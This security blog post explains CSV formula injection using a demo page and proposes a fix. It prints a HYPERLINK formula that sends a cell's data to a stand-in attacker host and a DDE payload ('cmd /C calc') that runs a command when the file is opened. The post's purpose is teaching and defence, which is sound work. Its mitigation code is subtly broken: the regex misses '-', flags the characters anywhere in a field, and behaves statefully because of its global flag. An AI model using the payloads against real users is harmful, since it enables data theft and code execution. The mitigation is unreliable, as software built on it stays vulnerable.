---
slug: is-csv-secure/
title: Is that CSV Secure?
date: 2017-12-22
category: attacks
subtitle: Defining CSV injection vulnerabilities
tags: security, csv, code, web
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330929/blog/is-csv-secure/cover_tteaiz.webp
alt: Blank CSV document icon
description: Comma-Separated Values file is a common extension in data files
  used in several application fields. Here we present a CSV vulnerability
  most people ignore.
keywords: CSV, Security, Vulnerability, Code, Web, Spreadsheet,
  Ethical Hacking, Pentesting
author: Jonathan Armas
writer: johna
name: Jonathan Armas
about1: Systems Engineer, Security+
about2: '"Be formless, shapeless like water" Bruce Lee'
source: https://unsplash.com/photos/Wpnoqo2plFA
---

Comma-Separated Values file (or CSV) is a type of file that stores
tabular data, numbers and text in plain text. Each line of the file is a
data record and each record consists of one or more fields separated by
commas. CSV is a common data exchange format that is widely supported by
consumer, business, and scientific applications. As an example, a user
may need to transfer information from a database program that stores
data in a proprietary format, to a spreadsheet that uses a completely
different format. The database program most likely can export its data
as "CSV"; the exported CSV file can then be imported by the spreadsheet
program.

<div class="imgblock">

![example](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330927/blog/is-csv-secure/csv-example_et64py.webp)

</div>

There is a vulnerability in this types of format that the most of
programmers ignores, that is "CSV Injection". As
[OWASP](https://www.owasp.org/index.php/CSV-Injection) says, it occurs
when websites embed untrusted input inside CSV files, when a spreadsheet
program is used to open a CSV file, any cell starting with '**=**' is
considered as a formula and crafted formulas can be used to malicious
attacks.

## CSV Injection Example

We have a page that stores data on a table and exports it on a CSV file

<div class="imgblock">

![page](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330927/blog/is-csv-secure/csv-example_et64py.webp)

</div>

We put some normal data and nothing happens

<div class="imgblock">

![input](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/normal-input_tryyrw.webp)

</div>

<div class="imgblock">

![result](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/normal-result_twbflm.webp)

</div>

But what happens if we put a formula like =2+5 in a field?

<div class="imgblock">

![formula-input](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/formula-input_x6toul.webp)

</div>

<div class="imgblock">

![formula-result](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/formula-result_tuzdgy.webp)

</div>

On our table nothing happens, but when we open the CSV file we get the
result of the formula that we introduced. This can be very dangerous if
someone introduce a more dangerous code like

``` text
  =HYPERLINK("http://dangerous.com?x="&A3&"[CR]","Error fetching info: Click me to resolve.")
```

When the user open the file it shows a link with our malicious site

<div class="imgblock">

![vuln](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/hyperlink-vuln_mlaocr.webp)

</div>

Also we can execute commands on the target with this formula injection,
in where we open the calc when someone opens the CSV file

``` text
  =cmd|' /C calc'!A0
```

It shows some warnings but the user trust in the source of the file and
accept

<div class="imgblock">

![warning-1](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330925/blog/is-csv-secure/first-warning_wbfqyq.webp)

</div>

<div class="imgblock">

![warning-2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330927/blog/is-csv-secure/second-warning_hha72t.webp)

</div>

And then the code execution

<div class="imgblock">

![exec](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/exec-example_bumpxl.webp)

</div>

The effectiveness of this vulnerability is that the user trust on the
source of the file without asking himself if is the normal behaviour
when someone opens a CSV file and the program asks form permission

### Solution

- First is user awareness, because Windows shows an alert when someone
  puts command execution code in the CSV file like we’ve seen

- Second, input validation, the most common characters to do this
  attack are:

<!-- end list -->

``` text
  =,+,-,@
```

A developer could make a validation like this regex

**validation.js.**

``` javascript
var regexp = new RegExp(/([=,-,+,@])/g);
```

And blocking this types of input, also, can put a space between the
dangerous character like ' =' to mitigate this vulnerability

``` javascript
if(regexp.test(formData.sdata1)){
  formData.sdata1 = " "+formData.sdata1
}
if(regexp.test(formData.sdata2)){
  formData.sdata2 = " "+formData.sdata2
}
```

In this example we can see that the spreadsheet program doesn’t
calculate the formula and our input is secure

<div class="imgblock">

![secure-input](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330927/blog/is-csv-secure/secure-input_bisups.webp)

</div>

<div class="imgblock">

![secure-result](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330924/blog/is-csv-secure/secure-result_sfsxxc.webp)

</div>

The source code of the page for testing can be found
[here](csvinjection.zip)
